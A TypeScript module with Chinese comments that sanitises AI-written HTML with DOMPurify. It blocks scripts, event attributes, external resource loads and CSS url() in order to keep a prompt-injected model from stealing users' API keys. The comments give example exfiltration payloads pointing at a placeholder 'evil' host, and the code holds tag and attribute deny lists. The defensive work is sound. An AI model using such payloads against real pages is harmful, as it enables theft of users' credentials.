/**
 * 净化 AI 写的 HTML
 *
 * ⚠️ 为什么这件事必须做，而不是"以后再说"：
 *
 * AI 写的 HTML 会被插进**我们自己的页面**。一旦模型（或者被提示注入的模型）写出
 * `<script>` 或 `<img onerror=...>`，就等于在我们的 App 里执行任意代码。
 *
 * 而本地 App 里最值钱的东西是**用户自己的 API Key** —— 那正是 XSS 想偷的。
 * 所以这不是"防御一个假想攻击"，是防御"我们自己的架构必然会引入的攻击面"。
 *
 * 策略（技术文档 §4.4）：白名单 + **彻底断掉对外发送数据的通道**
 *
 *   ① 只允许安全的标签（HTML / SVG / MathML）
 *   ② 禁止一切可执行的东西（script、事件属性…）—— DOMPurify 默认就会做
 *   ③ 禁止一切**外部资源**：能加载资源的那几个属性只允许 data: 开头
 *   ④ 连内联样式里的 url(...) 也堵掉 —— 那是最后一条能往外发数据的通道
 *
 * ① ~ ④ 合起来的效果：**AI 写的内容永远无法和外部通信**。这样即使净化有疏漏，
 * 也没有可用于窃取数据的信道。
 */

import DOMPurify, { type Config } from 'dompurify';

/**
 * 能加载外部资源的属性。
 *
 * 这些属性只要值不是 `data:` 开头，一律删掉 —— 否则
 * `<img src="https://evil/?data=...">` 就是一条现成的数据外发通道。
 */
const URI_ATTRS = new Set([
  'src',
  'href',
  'xlink:href',
  'srcset',
  'poster',
  'background',
  'action',
  'formaction',
  'ping',
  'cite',
  'longdesc',
  'usemap',
  'data',
  'codebase',
  'classid',
  'archive',
  'manifest',
  'profile',
  'icon',
]);

/** 允许的 data: 资源类型（图片和字体；不放行 data:text/html，那种点开就能跑脚本） */
const ALLOWED_DATA_URI = /^data:(?:image\/(?:png|jpeg|jpg|gif|webp|avif|svg\+xml)|font\/)/i;

/** 明确禁止的标签（DOMPurify 默认已挡掉大部分，这里再收紧一层） */
const FORBID_TAGS = [
  'script',
  'style', // 整块 <style> 会污染整个 App 的样式，禁掉；需要样式请用内联 style 属性
  'iframe',
  'frame',
  'frameset',
  'object',
  'embed',
  'applet',
  'form',
  'input',
  'textarea',
  'select',
  'option',
  'button',
  'link',
  'meta',
  'base',
  'template',
  'noscript',
];

const FORBID_ATTR = ['formaction', 'ping', 'http-equiv'];

/**
 * ⚠️ 这里**故意不设置** `ALLOWED_URI_REGEXP`。
 *
 * 踩过的坑：它是一个「**所有**属性的通用值过滤器」，不只是管 src/href。
 * 一旦收成"只允许 data:"，那么 `viewBox="0 0 10 10"`、`display="block"`
 * 这类**根本不是 URL 的值**也会被判为非法，属性被整个删掉 ——
 * 结果 SVG 图形和 MathML 公式全被毁掉。
 *
 * 正确做法：用默认的 URI 规则（它会挡掉 javascript: 之类），
 * 然后在上面的 URI_ATTRS 钩子里精确地只管"能加载资源的那几个属性"。
 */
const CONFIG: Config = {
  // 允许 HTML + SVG + MathML —— 公式图表都要用（AI 写的是 HTML，公式用 MathML）
  USE_PROFILES: { html: true, svg: true, mathMl: true },
  FORBID_TAGS,
  FORBID_ATTR,
  // 我们自己的区域标记 data-stage-region 要用，所以放开 data-* 属性
  ALLOW_DATA_ATTR: true,
};

let hookInstalled = false;

/**
 * 装净化钩子。两件事：
 *   ① 能加载外部资源的属性，值不是 data: 就删掉
 *   ② 内联样式里出现 url(...) 就整条样式删掉
 *      （`style="background:url(https://evil/?x)"` 不经过任何 URI 检查，
 *        但浏览器照样会去请求它）
 */
function ensureHook(): void {
  if (hookInstalled) return;
  hookInstalled = true;

  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (!(node instanceof Element)) return;

    for (const attr of Array.from(node.attributes)) {
      const name = attr.name.toLowerCase();

      if (URI_ATTRS.has(name) && !ALLOWED_DATA_URI.test(attr.value.trim())) {
        node.removeAttribute(attr.name);
        continue;
      }

      if (name === 'style' && /url\s*\(/i.test(attr.value)) {
        node.removeAttribute(attr.name);
      }
    }
  });
}

/**
 * 净化一段 AI 写的 HTML。
 * @returns 可以安全插入页面的 HTML 字符串
 */
export function sanitizeBoardHtml(html: string): string {
  ensureHook();
  return DOMPurify.sanitize(html, CONFIG);
}
